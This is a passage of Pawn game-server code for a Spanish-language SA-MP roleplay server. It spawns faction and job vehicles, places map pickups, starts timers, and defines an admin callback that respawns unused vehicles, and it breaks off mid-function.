	CochesPolicia[21] = AddStaticVehicleAnt(430, 646.9103, -2007.3157, 0.0745, 354.4583, -1, -1, VEHICULO_SPAWN);    // Predator
	CochesPolicia[22] = AddStaticVehicleAnt(525, 2458.3225, -2077.9106, 13.4237, 180.5472, 255, 103, VEHICULO_SPAWN);   // Grua 3
	CochesPolicia[23] = AddStaticVehicleAnt(596, 1601.9880, -1687.8237, 5.6110, 89.6723, 0, 1, VEHICULO_SPAWN); 		// Patrulla nueva 1
	CochesPolicia[24] = AddStaticVehicleAnt(596, 1602.2769, -1684.0154, 5.6119, 89.6658, 0, 1, VEHICULO_SPAWN); 		// Patrulla nueva 2
	CochesPolicia[25] = AddStaticVehicleAnt(596, 1591.4995, -1710.3190, 5.6105, 359.6988, 0, 1, VEHICULO_SPAWN); 		// Patrulla nueva 3
	CochesPolicia[26] = AddStaticVehicleAnt(596, 1595.5188, -1710.3881, 5.6109, 358.7049, 0, 1, VEHICULO_SPAWN); 		// Patrulla nueva 4
	CochesPolicia[27] = AddStaticVehicleAnt(528, 1546.5891, -1654.8442, 5.9344, 90.4177, 0, 0, VEHICULO_SPAWN); 		// FBI trucker 1
	CochesPolicia[28] = AddStaticVehicleAnt(528, 1546.4629, -1650.9556, 5.9348, 90.2691, 0, 0, VEHICULO_SPAWN); 		// FBI trucker 2
	CochesPolicia[29] = AddStaticVehicleAnt(601, 1530.5052, -1644.9598, 5.6494, 179.5481, 0, 0, VEHICULO_SPAWN); 		// SWAT Van 2

	CochesMedicos[0] = AddStaticVehicleAnt(407, 1097.6229, -1328.4508, 13.4449, 359.6445, 3, 3, VEHICULO_SPAWN);    // Camion de Bomberos
	CochesMedicos[1] = AddStaticVehicleAnt(407, 1110.9609, -1328.4464, 13.4448, 1.3679, 3, 3, VEHICULO_SPAWN);      // Camion de Bomberos
	CochesMedicos[2] = AddStaticVehicleAnt(407, 1123.9703, -1328.4863, 13.4420, 359.8991, 3, 3, VEHICULO_SPAWN);    // Camion de Bomberos
	CochesMedicos[3] = AddStaticVehicleAnt(416, 1095.5303, -1315.5038, 13.8521, 269.5015, 1, 3, VEHICULO_SPAWN);    // Ambulancia
	CochesMedicos[4] = AddStaticVehicleAnt(416, 1136.3173, -1338.6797, 13.8751, 0.5538, 1, 3, VEHICULO_SPAWN);      // Ambulancia
	CochesMedicos[5] = AddStaticVehicleAnt(416, 1141.5852, -1338.4622, 13.7902, 1.1260, 1, 3, VEHICULO_SPAWN);      // Ambulancia
	CochesMedicos[6] = AddStaticVehicleAnt(596, 1131.2094, -1327.8986, 13.3697, 0.5494, 3, 1, VEHICULO_SPAWN);      // Patrulla LS
	CochesMedicos[7] = AddStaticVehicleAnt(596, 1134.8329, -1309.3987, 13.3042, 359.3751, 3, 1, VEHICULO_SPAWN);    // Patrulla LS
	CochesMedicos[8] = AddStaticVehicleAnt(563, 1162.8477, -1309.0045, 32.2224, 271.4168, 1, 3, VEHICULO_SPAWN);    // Raindance [HELICOPTERO]

	CochesMecanicos[0] = AddStaticVehicleAnt(525, 2218.4348, -2285.8645, 13.4286, 45.0082, -1, 103, VEHICULO_SPAWN);                 	// Grua
	CochesMecanicos[1] = AddStaticVehicleAnt(525, 2249.0920, -2255.0837, 13.4255, 44.5224, -1, 103, VEHICULO_SPAWN);                 	// Grua
	CochesMecanicos[2] = AddStaticVehicleAnt(525, 2205.9604, -2298.2388, 13.4251, 44.9235, -1, 103, VEHICULO_SPAWN);                  // Grua
	CochesMecanicos[3] = AddStaticVehicleAnt(525, 2252.1050, -2251.8066, 13.4330, 46.0294, -1, 103, VEHICULO_SPAWN);                  // Grua
	CochesMecanicos[4] = AddStaticVehicleAnt(525, 2215.1714, -2289.1504, 13.4297, 45.4066, -1, 103, VEHICULO_SPAWN);                  // Grua
	CochesMecanicos[5] = AddStaticVehicleAnt(525, 2236.7637, -2267.4280, 13.4230, 44.9860, -1, 103, VEHICULO_SPAWN);                  // Grua
	CochesMecanicos[6] = AddStaticVehicleAnt(552, 2171.4011, -2235.4238, 13.0464, 315.0266, 96, -1, VEHICULO_SPAWN);                  // Utility
	CochesMecanicos[7] = AddStaticVehicleAnt(552, 2184.2957, -2334.2251, 13.2526, 42.7564, 96, -1, VEHICULO_SPAWN);                   // Utility
	CochesMecanicos[8] = AddStaticVehicleAnt(552, 2153.4280, -2289.0066, 13.0741, 225.0256, 96, -1, VEHICULO_SPAWN);                  // Utility
	CochesMecanicos[9] = AddStaticVehicleAnt(554, 2193.8828, -2311.0906, 13.6332, 43.2058, 96, 53, VEHICULO_SPAWN);                   // Yosemite
	CochesMecanicos[10] = AddStaticVehicleAnt(554, 2200.1372, -2304.9612, 13.6228, 41.6273, 96, 53, VEHICULO_SPAWN);                  // Yosemite

	CochesNoticias[0] = AddStaticVehicleAnt(582, 746.9738, -1335.4572, 13.7571, 180.2626, 2, 1, VEHICULO_SPAWN);                     // CNN Van
	CochesNoticias[1] = AddStaticVehicleAnt(582, 752.7899, -1335.1346, 13.7565, 178.3179, 2, 1, VEHICULO_SPAWN);                     // CNN Van
	CochesNoticias[2] = AddStaticVehicleAnt(582, 741.6085, -1335.1671, 13.7574, 179.1018, 2, 1, VEHICULO_SPAWN);                     // CNN Van
	CochesNoticias[3] = AddStaticVehicleAnt(488, 743.5662, -1372.6359, 25.9022, 358.8606, 2, 1, VEHICULO_SPAWN);                     // Marverik CNN [HELICOPTERO]

	for(new i=0; i<sizeof obtenerLicencia; i++)
	{
		obtenerLicencia[i][cocheExamen] = AddStaticVehicleAnt(obtenerLicencia[i][cocheModelo], obtenerLicencia[i][cochePos][0], obtenerLicencia[i][cochePos][1], obtenerLicencia[i][cochePos][2], obtenerLicencia[i][cochePos][3], random(128), random(128), VEHICULO_SPAWN);
		SetVehicleVirtualWorld(obtenerLicencia[i][cocheExamen], obtenerLicencia[i][cocheWorld]);
		LinkVehicleToInterior(obtenerLicencia[i][cocheExamen], obtenerLicencia[i][cocheInterior]);
	}

	CochesFbi[0] = AddStaticVehicleAnt(487,1259.5767,-1766.8031,36.2211,88.8390,0,0, VEHICULO_SPAWN);    // Maverick [HELICOPTERO]
	CochesFbi[1] = AddStaticVehicleAnt(490,1278.3546,-1829.1195,13.5140,90.3308,0,0, VEHICULO_SPAWN);    // FBI Rancher
    CochesFbi[2] = AddStaticVehicleAnt(490,1278.3518,-1823.9573,13.5118,88.0144,0,0, VEHICULO_SPAWN);    // FBI Rancher
    CochesFbi[3] = AddStaticVehicleAnt(490,1278.4779,-1818.9745,13.5126,89.4448,0,0, VEHICULO_SPAWN);    // FBI Rancher
    CochesFbi[4] = AddStaticVehicleAnt(490,1278.6953,-1813.9014,13.5112,90.4935,0,0, VEHICULO_SPAWN);    // FBI Rancher
    CochesFbi[5] = AddStaticVehicleAnt(490,1278.9941,-1809.0236,13.5113,90.7372,0,0, VEHICULO_SPAWN);     // FBI Rancher
    CochesFbi[6] = AddStaticVehicleAnt(507,1254.5813,-1833.5991,13.2160,358.0982,0,0, VEHICULO_SPAWN);    // Elegant
    CochesFbi[7] = AddStaticVehicleAnt(507,1249.7900,-1833.3782,13.2188,359.2847,0,0, VEHICULO_SPAWN);    // Elegant

    CochesPesca[0] = AddStaticVehicleAnt(453, 645.90002441, -2021.69995117, 0.00000000, 175.99548340, -1, -1, VEHICULO_SPAWN);    // Reefer
	CochesPesca[1] = AddStaticVehicleAnt(453, 634.70001221, -2020.80004883, 0.00000000, 175.99548340, -1, -1, VEHICULO_SPAWN);    // Reefer
	CochesPesca[2] = AddStaticVehicleAnt(453, 609.20001221, -2018.80004883, 0.00000000, 176.00000000, -1, -1, VEHICULO_SPAWN);    // Reefer
	CochesPesca[3] = AddStaticVehicleAnt(453, 597.09997559, -2018.09997559, 0.00000000, 176.00000000, -1, -1, VEHICULO_SPAWN);    // Reefer

	CochesGobierno[0] = AddStaticVehicleAnt(409, 1405.9868, -1794.7078, 13.3469, 89.9807, 1, 1, VEHICULO_SPAWN);    // Stretch
	CochesGobierno[1] = AddStaticVehicleAnt(426, 1406.5286, -1786.8263, 13.2902, 89.7796, 1, 1, VEHICULO_SPAWN);    // Premier
	CochesGobierno[2] = AddStaticVehicleAnt(426, 1406.5192, -1782.9362, 13.2900, 90.5440, 1, 1, VEHICULO_SPAWN);    // Premier
	CochesGobierno[3] = AddStaticVehicleAnt(426, 1406.6017, -1790.5774, 13.2898, 89.7113, 1, 1, VEHICULO_SPAWN);    // Premier
	
	transCoches[0] = AddStaticVehicleAnt(428, 1315.9596, -1009.3345, 30.9452, 179.9991, 1, 0, VEHICULO_SPAWN);
	transCoches[1] = AddStaticVehicleAnt(428, 1320.3640, -1009.5320, 30.9460, 179.7460, 1, 0, VEHICULO_SPAWN);
	transCoches[2] = AddStaticVehicleAnt(428, 1324.5209, -1009.3350, 30.9463, 179.9946, 1, 0, VEHICULO_SPAWN);
	
	aviadorCoches[0] = AddStaticVehicleAnt(593, 1976.8937, -2264.8049, 14.0058, 88.7450, 1, 3, VEHICULO_SPAWN);
	aviadorCoches[1] = AddStaticVehicleAnt(593, 1976.8389, -2281.7700, 14.0296, 90.2299, 1, 3, VEHICULO_SPAWN);
	aviadorCoches[2] = AddStaticVehicleAnt(593, 1976.5970, -2296.6084, 14.0052, 91.1037, 1, 3, VEHICULO_SPAWN);
	
	camioneroCoches[0] = AddStaticVehicleAnt(456, 2187.3853, -2655.9905, 13.7571, 359.9922, 91, 63, VEHICULO_SPAWN);
	camioneroCoches[1] = AddStaticVehicleAnt(456, 2183.2080, -2655.7793, 13.7582, 359.8748, 102, 65, VEHICULO_SPAWN);
	camioneroCoches[2] = AddStaticVehicleAnt(456, 2176.6067, -2655.9465, 13.7593, 359.7308, 105, 72, VEHICULO_SPAWN);
	camioneroCoches[3] = AddStaticVehicleAnt(456, 2172.4717, -2655.9424, 13.7574, 359.9766, 110, 93, VEHICULO_SPAWN);
	camioneroCoches[4] = AddStaticVehicleAnt(414, 2183.3992, -2614.5044, 13.6243, 181.0128, 72, 1, VEHICULO_SPAWN);
	camioneroCoches[5] = AddStaticVehicleAnt(414, 2188.6038, -2614.5525, 13.6696, 181.0128, 67, 1, VEHICULO_SPAWN);
	camioneroCoches[6] = AddStaticVehicleAnt(414, 2194.3459, -2614.4041, 13.6727, 181.0109, 43, 1, VEHICULO_SPAWN);
	camioneroCoches[7] = AddStaticVehicleAnt(414, 2200.3445, -2614.3152, 13.6767, 180.9812, 28, 1, VEHICULO_SPAWN);
	
	barrenderoCoches[0] = AddStaticVehicleAnt(574, 2476.1599, -1528.0881, 23.7328, 0.8741, 26, 26, VEHICULO_SPAWN);
	barrenderoCoches[1] = AddStaticVehicleAnt(574, 2479.0293, -1528.0151, 23.7415, 0.3697, 26, 26, VEHICULO_SPAWN);
	barrenderoCoches[2] = AddStaticVehicleAnt(574, 2481.5295, -1527.9969, 23.7415, 0.9154, 26, 26, VEHICULO_SPAWN);
	barrenderoCoches[3] = AddStaticVehicleAnt(574, 2490.4197, -1521.1801, 23.6646, 86.9811, 26, 26, VEHICULO_SPAWN);
	barrenderoCoches[4] = AddStaticVehicleAnt(574, 2490.6423, -1518.1351, 23.7205, 87.3001, 26, 26, VEHICULO_SPAWN);
	
	busesCoches[0] = AddStaticVehicleAnt(431, 1181.7528, -1794.7257, 13.2799, 0.0000, 0, 7, VEHICULO_SPAWN);
	busesCoches[1] = AddStaticVehicleAnt(431, 1172.8025, -1793.8965, 13.2799, 0.0000, 0, 7, VEHICULO_SPAWN);
	busesCoches[2] = AddStaticVehicleAnt(431, 1173.0237, -1775.5192, 13.2799, 0.0000, 0, 7, VEHICULO_SPAWN);
	busesCoches[3] = AddStaticVehicleAnt(431, 1181.8282, -1775.6251, 13.2799, 0.0000, 0, 7, VEHICULO_SPAWN);
	
	agricultorCoches[0] = AddStaticVehicleAnt(532, -378.3586, -1463.5305, 26.6907, 276.1610, 1, 1, VEHICULO_SPAWN);
	agricultorCoches[1] = AddStaticVehicleAnt(532, -377.3819, -1473.3136, 26.7020, 278.3134, 1, 1, VEHICULO_SPAWN);
	agricultorCoches[2] = AddStaticVehicleAnt(532, -376.0513, -1482.7598, 26.6991, 276.0969, 1, 1, VEHICULO_SPAWN);
	agricultorCoches[3] = AddStaticVehicleAnt(532, -374.6044, -1491.7760, 25.9729, 277.9727, 1, 1, VEHICULO_SPAWN);
	agricultorCoches[4] = AddStaticVehicleAnt(532, -373.1066, -1501.9865, 24.8727, 279.0297, 1, 1, VEHICULO_SPAWN);
	agricultorCoches[5] = AddStaticVehicleAnt(532, -371.4955, -1511.4672, 23.8557, 277.8488, 1, 1, VEHICULO_SPAWN);
	
	pizzaCoches[0] = AddStaticVehicleAnt(448, 2098.1230, -1793.0132, 12.9839, 90.0772, 3, 6, VEHICULO_SPAWN);
	pizzaCoches[1] = AddStaticVehicleAnt(448, 2098.2832, -1795.6893, 12.9883, 91.5060, 3, 6, VEHICULO_SPAWN);
	pizzaCoches[2] = AddStaticVehicleAnt(448, 2098.3613, -1798.0608, 12.9877, 91.7122, 3, 6, VEHICULO_SPAWN);
	pizzaCoches[3] = AddStaticVehicleAnt(448, 2098.3203, -1800.7795, 12.9845, 85.5136, 3, 6, VEHICULO_SPAWN);
	pizzaCoches[4] = AddStaticVehicleAnt(448, 2098.2366, -1813.5295, 12.9579, 87.1491, 3, 6, VEHICULO_SPAWN);
	pizzaCoches[5] = AddStaticVehicleAnt(448, 2098.3098, -1816.9644, 12.9802, 86.0768, 3, 6, VEHICULO_SPAWN);
	pizzaCoches[6] = AddStaticVehicleAnt(448, 2098.3701, -1821.2499, 12.9777, 94.8276, 3, 6, VEHICULO_SPAWN);
	
	taxiCoches[0] = AddStaticVehicleAnt(409, 1803.7998, -1928.5074, 13.1883, 0.0563, 1, 1, VEHICULO_SPAWN);
	taxiCoches[1] = AddStaticVehicleAnt(409, 1799.3241, -1928.5048, 13.1884, 359.6842, 1, 1, VEHICULO_SPAWN);
	taxiCoches[2] = AddStaticVehicleAnt(420, 1777.5203, -1911.9198, 13.1660, 359.4633, 6, 1, VEHICULO_SPAWN);
	taxiCoches[3] = AddStaticVehicleAnt(420, 1786.1836, -1912.1041, 13.1735, 358.3850, 6, 1, VEHICULO_SPAWN);
	taxiCoches[4] = AddStaticVehicleAnt(420, 1781.6458, -1911.8903, 13.1690, 0.2548, 6, 1, VEHICULO_SPAWN);
	taxiCoches[5] = AddStaticVehicleAnt(420, 1790.6207, -1912.1249, 13.1755, 357.8992, 6, 1, VEHICULO_SPAWN);
	taxiCoches[6] = AddStaticVehicleAnt(420, 1777.3435, -1928.6910, 13.1644, 359.6104, 6, 1, VEHICULO_SPAWN);
	taxiCoches[7] = AddStaticVehicleAnt(420, 1782.0156, -1928.6418, 13.1682, 359.6501, 6, 1, VEHICULO_SPAWN);
	
	basureroCoches[0] = AddStaticVehicleAnt(408, 2168.7283, -1986.8669, 14.1064, 270.4478, 1, 1, VEHICULO_SPAWN);
    basureroCoches[1] = AddStaticVehicleAnt(408, 2168.5569, -1995.5016, 14.0945, 269.1107, 1, 1, VEHICULO_SPAWN);
    basureroCoches[2] = AddStaticVehicleAnt(408, 2179.4407, -2001.3475, 14.0909, 358.0490, 1, 1, VEHICULO_SPAWN);
    basureroCoches[3] = AddStaticVehicleAnt(408, 2186.5439, -1999.8292, 14.0859, 359.2122, 1, 1, VEHICULO_SPAWN);
	
	pescadorCoches[0] = AddStaticVehicleAnt(453, 25.4070, -1643.7441, -0.3535, 177.3108, 56, 56, VEHICULO_SPAWN);
	pescadorCoches[1] = AddStaticVehicleAnt(453, 16.5145, -1643.7509, -0.2016, 181.2872, 56, 56, VEHICULO_SPAWN);
	pescadorCoches[2] = AddStaticVehicleAnt(453, 16.4793, -1699.4603, -0.3028, 358.6423, 56, 56, VEHICULO_SPAWN);
	pescadorCoches[3] = AddStaticVehicleAnt(453, 24.7192, -1699.6326, -0.3033, 357.4491, 56, 56, VEHICULO_SPAWN);
	
	CochesRenta[0] = AddStaticVehicleAnt(484, 572.09997559, -2007.80004883, 0.00000000, 176.00000000, -1, -1, VEHICULO_SPAWN);     // Marquis [BOTE]
	CochesRenta[1] = AddStaticVehicleAnt(454, 557.20001221, -2004.40002441, 0.00000000, 86.00000000, -1, -1, VEHICULO_SPAWN);      // Tropic  [BOTE]
	CochesRenta[2] = AddStaticVehicleAnt(493, 633.90002441, -1956.00000000, 0.00000000, 174.00000000, -1, -1, VEHICULO_SPAWN);     // Jetmax  [BOTE]
	CochesRenta[3] = AddStaticVehicleAnt(446, 610.00000000, -1954.00000000, -1.00000000, 174.00000000, -1, -1, VEHICULO_SPAWN);    // Squalo  [BOTE]
	CochesRenta[4] = AddStaticVehicleAnt(452, 621.29998779, -1956.00000000, 0.00000000, 174.00000000, -1, -1, VEHICULO_SPAWN);     // Speeder [BOTE]
	CochesRenta[5] = AddStaticVehicleAnt(454, 556.40002441, -2018.19995117, 0.00000000, 86.00000000, -1, -1, VEHICULO_SPAWN);      // Tropic  [BOTE]
	CochesRenta[6] = AddStaticVehicleAnt(462, 1189.0740, -1362.4146, 13.1538, 0.0000, 1, 1, VEHICULO_SPAWN);                // Faggio
	CochesRenta[7] = AddStaticVehicleAnt(462, 1188.9646, -1360.5306, 13.1573, 0.0000, 1, 1, VEHICULO_SPAWN);                // Faggio
	CochesRenta[8] = AddStaticVehicleAnt(462, 1188.8898, -1364.8148, 13.1487, 0.0000, 1, 1, VEHICULO_SPAWN);                // Faggio
	CochesRenta[9] = AddStaticVehicleAnt(462, 1188.7474, -1367.1798, 13.1555, 0.0000, 1, 1, VEHICULO_SPAWN);                // Faggio
   	CochesRenta[10] = AddStaticVehicleAnt(462, 1516.9426, -1740.9094, 13.1280, 0.6564, 1, 1, VEHICULO_SPAWN);                      // Faggio
	CochesRenta[11] = AddStaticVehicleAnt(462, 1519.6926, -1740.9188, 13.1390, 0.6819, 1, 1, VEHICULO_SPAWN);                      // Faggio
	CochesRenta[12] = AddStaticVehicleAnt(462, 1522.4230, -1740.9619, 13.1282, 0.6272, 1, 1, VEHICULO_SPAWN);                      // Faggio
	CochesRenta[13] = AddStaticVehicleAnt(462, 1524.9800, -1740.9399, 13.1283, 0.6530, 1, 1, VEHICULO_SPAWN);                      // Faggio
	CochesRenta[14] = AddStaticVehicleAnt(462, 1440.0135, -1740.8601, 13.1388, 0.6501, 1, 1, VEHICULO_SPAWN);                      // Faggio
	CochesRenta[15] = AddStaticVehicleAnt(462, 1437.4845, -1740.8759, 13.1280, 0.6526, 1, 1, VEHICULO_SPAWN);                      // Faggio
	CochesRenta[16] = AddStaticVehicleAnt(462, 1434.8259, -1740.8284, 13.1260, 0.6557, 1, 1, VEHICULO_SPAWN);                      // Faggio
	CochesRenta[17] = AddStaticVehicleAnt(462, 1432.4387, -1740.9076, 13.1295, 0.6557, 1, 1, VEHICULO_SPAWN);                      // Faggio
	CochesRenta[18] = AddStaticVehicleAnt(401, 1670.2767, -1889.9430, 13.3264, 106.6371, 7, 7, VEHICULO_SPAWN);                    // Bravura
	CochesRenta[19] = AddStaticVehicleAnt(401, 1670.1786, -1894.2664, 13.3259, 107.6118, 7, 7, VEHICULO_SPAWN);                    // Bravura
	CochesRenta[20] = AddStaticVehicleAnt(401, 1633.4834, -1908.3682, 13.3306, 333.7939, 7, 7, VEHICULO_SPAWN);                    // Bravura
	CochesRenta[21] = AddStaticVehicleAnt(401, 1639.3525, -1907.5579, 13.3317, 332.3027, 7, 7, VEHICULO_SPAWN);                    // Bravura
	CochesRenta[22] = AddStaticVehicleAnt(401, 1644.1488, -1906.1967, 13.3316, 332.2894, 7, 7, VEHICULO_SPAWN);                    // Bravura
	CochesRenta[23] = AddStaticVehicleAnt(401, 1648.3612, -1905.6107, 13.3317, 332.5301, 7, 7, VEHICULO_SPAWN);                    // Bravura
	CochesRenta[24] = AddStaticVehicleAnt(571, 2395.8315, -2475.9912, 13.4294, 178.6270, 3, 1, VEHICULO_SPAWN);                    // Kart [Pista de Carreras]
	CochesRenta[25] = AddStaticVehicleAnt(571, 2401.3804, -2476.1543, 13.4291, 179.9190, 3, 1, VEHICULO_SPAWN);                    // Kart [Pista de Carreras]
	CochesRenta[26] = AddStaticVehicleAnt(571, 2406.8181, -2475.8611, 13.4262, 181.8267, 3, 1, VEHICULO_SPAWN);                    // Kart [Pista de Carreras]
	CochesRenta[27] = AddStaticVehicleAnt(571, 2412.3926, -2475.4084, 13.4330, 179.6326, 3, 1, VEHICULO_SPAWN);                    // Kart [Pista de Carreras]
	CochesRenta[28] = AddStaticVehicleAnt(571, 2417.7339, -2475.6951, 13.4336, 179.2878, 3, 1, VEHICULO_SPAWN);                    // Kart [Pista de Carreras]
	CochesRenta[29] = AddStaticVehicleAnt(571, 2423.5378, -2475.4873, 13.4323, 181.7608, 3, 1, VEHICULO_SPAWN);                    // Kart [Pista de Carreras]
	CochesRenta[30] = AddStaticVehicleAnt(462, 1726.2134, -1858.0603, 13.0034, 271.3877, 7, 7, VEHICULO_SPAWN);                    // Faggio Renta
	CochesRenta[31] = AddStaticVehicleAnt(462, 1729.0326, -1857.9923, 12.9927, 271.3877, 7, 7, VEHICULO_SPAWN);                    // Faggio Renta
	CochesRenta[32] = AddStaticVehicleAnt(462, 1732.1603, -1857.9167, 12.9919, 271.3877, 7, 7, VEHICULO_SPAWN);                    // Faggio Renta
	CochesRenta[33] = AddStaticVehicleAnt(462, 1724.9100, -1851.9725, 13.0027, 268.0153, 7, 7, VEHICULO_SPAWN);                    // Faggio Renta
	CochesRenta[34] = AddStaticVehicleAnt(462, 1727.0940, -1852.0483, 12.9976, 268.0153, 7, 7, VEHICULO_SPAWN);                    // Faggio Renta
	CochesRenta[35] = AddStaticVehicleAnt(462, 1729.8914, -1852.0063, 13.0026, 269.8279, 7, 7, VEHICULO_SPAWN);                    // Faggio Renta
	CochesRenta[36] = AddStaticVehicleAnt(462, 1732.4414, -1852.0145, 12.9957, 269.8286, 7, 7, VEHICULO_SPAWN);                    // Faggio Renta

    CochesFortCarson[0] = AddStaticVehicleAnt(416,-322.0052,1058.2400,19.8917,358.9304,1,53, VEHICULO_SPAWN); //Ambulancia 1
    CochesFortCarson[1] = AddStaticVehicleAnt(416,-303.9848,1036.0413,19.7428,269.2839,1,53, VEHICULO_SPAWN); //Ambulancia 2
    CochesFortCarson[2] = AddStaticVehicleAnt(416,-303.6931,1032.0338,19.7427,270.1388,1,53, VEHICULO_SPAWN); //Ambulancia 3
    CochesFortCarson[3] = AddStaticVehicleAnt(416,-303.8066,1015.6682,19.7431,269.4314,1,53, VEHICULO_SPAWN); //Ambulancia 4
    CochesFortCarson[4] = AddStaticVehicleAnt(563,-333.7928,1051.5588,26.7936,359.1252,1,53, VEHICULO_SPAWN); //Helicoptero
    
	tren = AddStaticVehicleAnt(538, 1700.7551, -1953.6531, 14.8756, 200.0, -1, -1, VEHICULO_SPAWN);
	
	CargarMaletas();
	
	for(new vehicle=1; vehicle<MAX_VEHICLES; vehicle++) Gas[vehicle] = 1000;
	
    //mecánicos
    CreateDynamicPickup(1239, 1, 2124.6816, -2272.2881, 20.6719);
    CreateDynamicPickup(1239, 1, 2132.3005, -2280.6406, 14.7769);
	
	// -========================= Dynamic Pickups ========================- //
	/*    Police LA     */
	CreateDynamicPickup(1314, 1, 267.5095, 87.0759, 1001.0391); // arrestar LSPD
	CreateDynamicPickup(1314, 1, 200.7091, 168.4553, 1003.0234); // arrestar FBI
	CreateDynamicPickup(1318, 1, 242.7591, 66.4315, 1003.6406); // Inside PD elevator
    CreateDynamicPickup(1318, 1, 1524.5724, -1677.8043, 6.2188); // PD Tunnel
    CreateDynamicPickup(1318, 1, 302.8551, -1510.9399, 3267.0940); // PD Tunnel 2
    CreateDynamicPickup(1318, 1, 1557.7257, -1675.2711, 28.3955); // PD roof
    CreateDynamicPickup(1318, 1, 1810.7339, -1423.0044, 13.7808); // camaras
	/*          Other ENTER / EXITS     */
	CreateDynamicPickup(1239, 1, 223.0572, 185.6162, 1003.0313); // EQuipo FBI
   	CreateDynamicPickup(1239, 1, -2665.0129, 535.0582, 48.0791); // Ascensor Planta 2-3
	CreateDynamicPickup(1239, 1, 893.6022, -2488.9248, 3098.3235); //JOB Pescador
	/*      Info & Ayuda & Points       */
	CreateDynamicPickup(1239, 1, 364.4181, 186.8598, 1014.1875); // Autoescuela EXAMEN CAr
	CreateDynamicPickup(1239, 1, 2556.3853, -1296.8981, 1044.1250); // FABRICAR ARMAS
	CreateDynamicPickup(1239, 1, 2543.2500, -1296.3975, 1044.1250); // FABRICAR ARMAS
	CreateDynamicPickup(1239, 1, 2542.9377, -1290.5266, 1044.1250); // FABRICAR ARMAS
	CreateDynamicPickup(1239, 1, 2556.0679, -1290.1639, 1044.1250); // FABRICAR ARMAS
	CreateDynamicPickup(1239, 1, 1623.6274, -2150.6238, 13.6528); // Equipo Mecanico
	CreateDynamicPickup(1239, 1, 366.6122, 158.6483, 1008.3828); // Equipo Gobierno
	/* Pickups mapas información */
	CreateDynamicPickup(1239, 1, 1181.4065, -1318.3972, 13.6281);
	CreateDynamicPickup(1239, 1, 772.0750, -1327.3168, 13.5469);
	CreateDynamicPickup(1239, 1, 1813.9435, -1901.8436, 13.5730);
	CreateDynamicPickup(1239, 1, 1639.5374, -2187.5317, 13.5469);
	CreateDynamicPickup(1239, 1, 1839.1881, -1421.8048, 13.5625);
	CreateDynamicPickup(1239, 1, 1193.3491, -1156.8507, 23.8864);
	CreateDynamicPickup(1239, 1, 456.6184, -1493.9646, 31.0939);
	CreateDynamicPickup(1239, 1, 1451.2942, -1026.9141, 23.8281);
	CreateDynamicPickup(1239, 1, 2089.0627, -1823.5455, 13.5469);
	CreateDynamicPickup(1239, 1, 1718.7406, -1865.7048, 13.5723);
	CreateDynamicPickup(1239, 1, 1271.5137, -994.5891, 35.6477);
	printf("ZZ-RP: %d Pickups Cargados", CountDynamicPickups());

	if(realtime)
	{
		new tmphour;
		new tmpminute;
		new tmpsecond;
		gettime(tmphour, tmpminute, tmpsecond);
		FixHour(tmphour);
		tmphour = shifthour;
		SetWorldTime(tmphour);
	}
	for(new i = 1; i < MAX_LINEAS; i++) Periodico[i] = "{00ff00}Disponible";
			
	//Renderizacion y Optimizacion
	SetTimer("StreamMediaHora", 1800000, true);//Media Hora
	SetTimer("Timer1000ms", 1000, true);//Un Segundo
	SetTimer("StreamSegundo", 1000, true);//Un Segundo
	SetTimer("StreamMedioSegundo", 500, true);//Medio Segundo
	SetTimer("Timer5000ms", 5000, true);//5 Segundos

    for(new i=0;i<MAX_PLAYERS;i++)
	{
		bHambre[i] = CreateProgressBar(549.00, 59.00, 55.50, 3.20, -5963521, 100.0);
	}
	
	//accionesEstado();
	return 1;
}
CallBack::respawnAutos20s(playerid, tipo)
{
	new bool:enUso[MAX_VEHICLES char], tmp[86];
	for(new i=0, t=GetMaxPlayers(); i<t; i++)
	{
		if(!IsPlayerConnected(i)) continue;
		if(IsPlayerInAnyVehicle(i)) enUso{GetPlayerVehicleID(i)} = true;
	}
	//
	switch(tipo)
	{
		case 0:
		{
			for(new x=1;x<MAX_VEHICLES;x++)
			{
				if(EsCochePolicial(x))
				{
					spawnAuto(!enUso{x} ? (x) : (0));
				}
				if(SAMD_Vehicle(x))
				{
					spawnAuto(!enUso{x} ? (x) : (0));
				}
				if(Mecanico_Vehicle(x))
				{
					spawnAuto(!enUso{x} ? (x) : (0));
				}
				if(CNN_Vehicle(x))
				{
					spawnAuto(!enUso{x} ? (x) : (0));
				}
				if(FBI_Vehicle(x))
				{
					spawnAuto(!enUso{x} ? (x) : (0));
				}
				if(Gobierno_Vehicle(x))
				{
					spawnAuto(!enUso{x} ? (x) : (0));
				}
				if(EsFortCarson(x))
				{
					spawnAuto(!enUso{x} ? (x) : (0));
				}
				for(new i=0; i<sizeof(Autosfacc); i++)
				{
					if(Autosfacc[i][af@carid] == x)
					{
						spawnAuto(!enUso{x} ? (x) : (0));
					}
				}
			}
			
			format(tmp, sizeof(tmp), "El administrador %s hizo un respawn de autos de faccion [SIN USO]", PlayerName(playerid));
			AdminMensaje(tmp);
		}
		case 1:
		{
			for(new x=1;x<MAX_VEHICLES;x++)
			{
				if(transAuto(x))
				{
					spawnAuto(!enUso{x} ? (x) : (0));
				}
				if(aviadorAuto(x))
				{
					spawnAuto(!enUso{x} ? (x) : (0));
				}
				if(camioneroAuto(x))
				{
					spawnAuto(!enUso{x} ? (x) : (0));
				}
				if(barrenderoAuto(x))
				{
					spawnAuto(!enUso{x} ? (x) : (0));
				}
				if(busesAuto(x))
				{
					spawnAuto(!enUso{x} ? (x) : (0));
				}
				if(agricultorAuto(x))
				{
					spawnAuto(!enUso{x} ? (x) : (0));
				}
				if(pizzaAuto(x))
				{
					spawnAuto(!enUso{x} ? (x) : (0));
				}
				if(taxiAuto(x))
				{
					spawnAuto(!enUso{x} ? (x) : (0));
				}
				if(basureroAuto(x))
				{
					spawnAuto(!enUso{x} ? (x) : (0));
				}
				if(pescadorAuto(x))
				{
					spawnAuto(!enUso{x} ? (x) : (0));
				}
			}
			
			format(tmp, sizeof(tmp), "El administrador %s hizo un respawn de autos de Trabajo [SIN USO]", PlayerName(playerid));
			AdminMensaje(tmp);
		}
		case 2:
		{
			for(new x=1;x<MAX_VEHICLES;x++)
			{
				if(Hire_Vehicle(x))
				{
					spawnAuto(!enUso{x} ? (x) : (0));
				}
			}
			
			format(tmp, sizeof(tmp), "El administrador %s hizo un respawn de autos de renta [SIN USO]", PlayerName(playerid));
			AdminMensaje(tmp);
		}
	}
	return 1;
}
CallBack::devaccGanancia(playerid)
{
	new iyear, imes, idia, string[126];
	getdate(iyear, imes, idia);
	for(new i=0; i<8; i++)
	{
